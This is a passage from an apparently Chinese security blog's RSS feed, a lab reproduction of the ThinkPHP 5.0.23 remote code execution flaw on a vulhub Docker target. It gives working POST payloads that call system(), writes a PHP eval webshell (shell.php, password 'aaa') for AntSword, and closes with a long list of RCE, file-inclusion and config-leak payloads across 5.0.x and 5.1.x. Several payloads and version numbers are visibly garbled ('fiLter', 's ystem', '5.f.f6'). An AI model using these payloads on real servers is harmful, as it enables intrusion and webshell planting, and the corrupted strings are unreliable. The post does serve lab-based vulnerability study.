class="mi">0&lt;/span>&lt;span class="p">)]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="err">存在&lt;/span>&lt;span class="n">ThinkPHP&lt;/span> &lt;span class="mf">5.&lt;/span>&lt;span class="n">x&lt;/span> &lt;span class="err">数据库信息泄露&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Payload&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="n">hostname&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">mysql&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="n">database&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">cat&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid><description>&lt;img src="http://localhost:1313/images/31.webp" alt="Featured image of post 【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞" />&lt;h1 id="漏洞形成原因">漏洞形成原因&lt;/h1>
&lt;h2 id="框架介绍">框架介绍：&lt;/h2>
&lt;p>ThinkPHP是一款运用极广的PHP开发框架。&lt;/p>
&lt;h2 id="漏洞引入">漏洞引入：&lt;/h2>
&lt;p>其5.0.23以前的版本中，获取&lt;strong>method&lt;/strong>的方法中没有正确处理方法名，导致攻击者可以调用&lt;strong>Request&lt;/strong>类任意方法并构造利用链，从而导致远程代码执行漏洞。&lt;/p>
&lt;h1 id="漏洞如何利用">漏洞如何利用&lt;/h1>
&lt;p>访问靶机地址+端口号 进入首页&lt;br>
Burp抓包修改传参方式为Post，传入参数为&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=pwd&amp;#34;&lt;/span>&lt;span class="err">，其中&lt;/span>&lt;span class="n">pwd为系统执行命令可进行一系列操作&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;p>使用&lt;strong>vulhub&lt;/strong>靶场进行搭建&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd thinkphp/5.0.23-rce/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094154.png" alt="image.png">&lt;br>
访问链接：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094245.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞复现">漏洞复现&lt;/h1>
&lt;p>burp抓包&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094438.png" alt="image.png">&lt;br>
修改&lt;br>
传参方式为Post，url后接入&lt;code>/index.php?s=captch&lt;/code>，传入参数为&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">__construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">pwd&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094649.png" alt="image.png">&lt;br>
&lt;strong>尝试写入phpinfo&lt;/strong>&lt;br>
参数改成&lt;code>echo &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot; &amp;gt; info.php&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">__construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095528.png" alt="image.png">&lt;br>
&lt;strong>写入一句话&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">__construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;?php eval($_POST[aaa]); ?&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">shell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095644.png" alt="image.png">&lt;br>
&lt;strong>上蚂剑&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/shell.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">密码：aaa
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095726.png" alt="image.png">&lt;br>
&lt;strong>成功&lt;/strong>&lt;br>
&lt;strong>做完实验后关闭环境 docker-compose down&lt;/strong>&lt;/p>
&lt;h1 id="更多版本">更多版本&lt;/h1>
&lt;p>漏洞触发点和版本的不同，所以payload也不⼀样,条件也不⼀样&lt;br>
5.0.13~5.0.19默认情况下config中的app_debug配置项为false。&lt;br>
复现的时候需要开启这个&lt;br>
&lt;strong>总结⼀下 5.1.x ：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkRequest&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">input&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">pwd&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkviewdriverPhp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">dispLay&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">php&lt;/span> &lt;span class="n">phpinfo&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinktempLatedriverfiLe&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">cacheFiLe&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">sheLL&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="err">?&lt;/span> &lt;span class="n">php&lt;/span> &lt;span class="n">phpinfo&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkContainer&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">var&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkapp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="n">ystem&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>5.0.x ：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkconfig&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">database&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">username&lt;/span> &lt;span class="c1"># 获取配置信息&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkLang&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Load&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLe&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">jpg&lt;/span> &lt;span class="c1"># 包含任意⽂件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkConfig&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Load&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLe&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span> &lt;span class="c1"># 包含任意.php⽂件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkapp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="n">ystem&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">thinkapp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="n">ystem&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>5.0.13：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;php.LocaL/thinkphp5.8.5/pubLic/index.php?s=index &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">方法：&lt;/span>&lt;span class="n">post&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Body内容&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">phpinfo&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">GET&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>其他&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ThinkPHP ≤ 5.8.f3 POST /?s=index/index&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ThinkPHP ≤ 5.8.23、5.f.8 ≤ 5.f.f6 需要开启框架app_debug &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">POST&lt;/span> &lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">aL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ThinkPHP ≤ 5.8.23 需要存在xxx的method路由，例如captcha&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">POST&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">xxx&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">f&lt;/span>
